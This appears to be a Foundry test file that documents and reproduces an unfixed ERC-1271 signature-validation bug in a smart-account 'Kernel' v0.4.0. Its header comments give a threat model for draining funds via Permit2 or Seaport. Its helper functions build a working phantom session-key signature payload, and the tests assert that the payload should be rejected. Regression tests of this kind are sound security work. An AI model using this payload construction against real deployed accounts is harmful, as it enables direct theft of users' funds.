// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {IEntryPoint} from "account-abstraction/interfaces/IEntryPoint.sol";
import {Kernel} from "src/Kernel.sol";
import {KernelFactory} from "src/KernelFactory.sol";
import {KernelUUPS} from "src/KernelUUPS.sol";
import {KernelImmutableECDSA} from "src/KernelImmutableECDSA.sol";
import {Install} from "src/types/Structs.sol";
import {ERC1271_INVALID, ERC1271_MAGICVALUE} from "src/types/Constants.sol";
import {EntryPointLib} from "../utils/EntryPointLib.sol";
import {ECDSAValidator} from "../mock/ECDSAValidator.sol";
import {KernelHelper} from "../KernelHelper.sol";

/// @title  PhantomSessionKey — failing test for the unfixed enable-mode ERC-1271 bug
///
/// @notice STATUS: this test is EXPECTED TO FAIL on v0.4.0. Once the team binds the
///         enable-mode ERC-1271 digest to the `hash` being verified, the assertions
///         here will pass.
///
/// @dev    Bug: `_erc1271IsValidSignatureNowCalldata` enable branch in
///         `src/core/ModuleManager.sol:138-152` lets a session-key validator K validate
///         arbitrary ERC-1271 hashes BEFORE the install userOp is consumed. The digest
///         signed by `_verifyInstallSignatureRaw` is `(struct_hash, nonce, installHash)` —
///         it is NOT bound to the ERC-1271 `hash` argument, and `_checkNonce` is view-only.
///         So a single root-signed enable credential acts as an unbounded ERC-1271
///         signing credential for K (Permit2 / Seaport / Uniswap-X / DAI permit drains).
///
/// @dev    Threat model:
///           1. Owner pre-signs an enable-mode install of session validator K
///              (the standard sponsored-userOp / on-demand-session-key pattern).
///           2. The install userOp is never consumed: bundler drops it, attacker
///              withholds it, user abandons the action, dApp state flips before
///              submission, or the user revokes via a different mechanism without
///              bumping this specific install nonce.
///           3. K signs hashes — either as part of K's normal life (Permit2 digests,
///              Seaport orders, Uniswap-X / CowSwap orders, EIP-712 messages) or via
///              compromise / malicious-dApp phishing.
///         Outcome: kernel returns ERC1271_MAGICVALUE for the attacker's chosen hash;
///         attacker drains via Permit2 / Seaport / order-protocol flows.
///         Severity: HIGH (Immunefi: direct theft of funds with conditions).
///         The owner's "intent to install K" is conflated with "consent to arbitrary
///         pre-install ERC-1271 authority for K" — the bug effectively pre-activates K's
///         ERC-1271 signing authority for unbounded hashes until the install nonce is
///         consumed or invalidated.
///
/// @dev    Expected fix: hash the ERC-1271 `hash` argument into the install digest
///         (or maintain a separate per-hash struct hash on the ERC-1271 path), so
///         each (nonce, packages, enableSig) tuple authorizes exactly one hash.
contract PhantomSessionKeyTest is Test {
    bytes32 constant PERSONAL_SIGN_TYPEHASH = keccak256("PersonalSign(bytes prefixed)");

    IEntryPoint ep;
    KernelFactory factory;
    ECDSAValidator rootValidator;
    ECDSAValidator sessionValidator;
    Kernel kernel;

    address owner;
    uint256 ownerKey;
    address alice;
    uint256 aliceKey;

    function setUp() external {
        ep = EntryPointLib.deploy();
        KernelUUPS uups = new KernelUUPS(ep);
        KernelImmutableECDSA immutableEcdsa = new KernelImmutableECDSA(ep);
        factory = new KernelFactory(uups, immutableEcdsa);

        (owner, ownerKey) = makeAddrAndKey("Owner");
        (alice, aliceKey) = makeAddrAndKey("Alice");

        rootValidator = new ECDSAValidator();
        sessionValidator = new ECDSAValidator();

        Install[] memory bootPkgs = new Install[](1);
        bootPkgs[0] = Install({
            moduleType: 1,
            module: address(rootValidator),
            moduleData: abi.encodePacked(owner),
            internalData: hex""
        });
        kernel = factory.deploy(bootPkgs, 0);
    }

    /// @notice Asserts the kernel REJECTS a phantom-session-key ERC-1271 signature.
    ///         Currently FAILS on v0.4.0 because the bug is unfixed: the kernel returns
    ///         ERC1271_MAGICVALUE for an attacker-chosen hash even though the install
    ///         userOp was never consumed.
    function test_phantom_session_key_should_be_rejected_on_arbitrary_hash() external {
        Install[] memory packages = _sessionPackages();
        bytes memory enableSignature = _ownerEnableSig(packages);

        // Owner did NOT submit the install userOp. Nonce key 0 stays at 0; module not installed.
        assertEq(uint64(kernel.nonce(0)), 0, "install nonce 0 must be untouched (precondition)");
        assertFalse(kernel.isModuleInstalled(1, address(sessionValidator), hex""), "session validator not installed");

        bytes32 attackerHash = keccak256("PERMIT2: drain-account-tokens");
        bytes memory attackerSig = _wrapPhantomSig(attackerHash, packages, enableSignature);

        // EXPECTED-AFTER-FIX: kernel must NOT validate K's signature on a hash the
        // owner never authorized — this should return ERC1271_INVALID.
        bytes4 result = kernel.isValidSignature(attackerHash, attackerSig);
        assertEq(result, ERC1271_INVALID, "phantom enable credential must not authorize an arbitrary hash");
    }

    /// @notice Asserts the kernel REJECTS a SECOND, unrelated ERC-1271 hash under the
    ///         same enable credential. Currently FAILS on v0.4.0 because the credential
    ///         is unboundedly reusable (`_checkNonce` is view-only on the ERC-1271 path).
    function test_phantom_session_key_should_not_be_unbounded() external {
        Install[] memory packages = _sessionPackages();
        bytes memory enableSignature = _ownerEnableSig(packages);

        // Two distinct attacker-chosen hashes. Both must be rejected.
        bytes4 first = kernel.isValidSignature(
            keccak256("attack-1"), _wrapPhantomSig(keccak256("attack-1"), packages, enableSignature)
        );
        bytes4 second = kernel.isValidSignature(
            keccak256("attack-2"), _wrapPhantomSig(keccak256("attack-2"), packages, enableSignature)
        );

        assertEq(first, ERC1271_INVALID, "first phantom hash must be rejected");
        assertEq(second, ERC1271_INVALID, "second phantom hash must be rejected (no unbounded reuse)");
    }

    function _sessionPackages() internal view returns (Install[] memory packages) {
        packages = new Install[](1);
        packages[0] = Install({
            moduleType: 1,
            module: address(sessionValidator),
            moduleData: abi.encodePacked(alice),
            internalData: hex""
        });
    }

    function _ownerEnableSig(Install[] memory packages) internal view returns (bytes memory) {
        bytes32 enableDigest = KernelHelper.installDigest(address(kernel), false, 0, packages);
        (uint8 ev, bytes32 er, bytes32 es) = vm.sign(ownerKey, enableDigest);
        return abi.encodePacked(er, es, ev);
    }

    function _wrapPhantomSig(bytes32 attackerHash, Install[] memory packages, bytes memory enableSignature)
        internal
        view
        returns (bytes memory)
    {
        bytes32 innerHash = _kernelHashTypedData(keccak256(abi.encode(PERSONAL_SIGN_TYPEHASH, attackerHash)));
        (uint8 av, bytes32 ar, bytes32 as_) = vm.sign(aliceKey, innerHash);
        bytes memory aliceSig = abi.encodePacked(ar, as_, av);

        return abi.encodePacked(
            bytes1(0x08),
            bytes1(0x01),
            bytes20(address(sessionValidator)),
            abi.encode(uint256(0), packages, enableSignature, aliceSig),
            bytes2(0x0000)
        );
    }

    function _kernelHashTypedData(bytes32 structHash) internal view returns (bytes32) {
        (, string memory name, string memory version, uint256 chainId, address verifyingContract,,) =
            kernel.eip712Domain();
        bytes32 domainSeparator = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes(name)),
                keccak256(bytes(version)),
                chainId,
                verifyingContract
            )
        );
        return keccak256(abi.encodePacked(bytes2(0x1901), domainSeparator, structHash));
    }
}
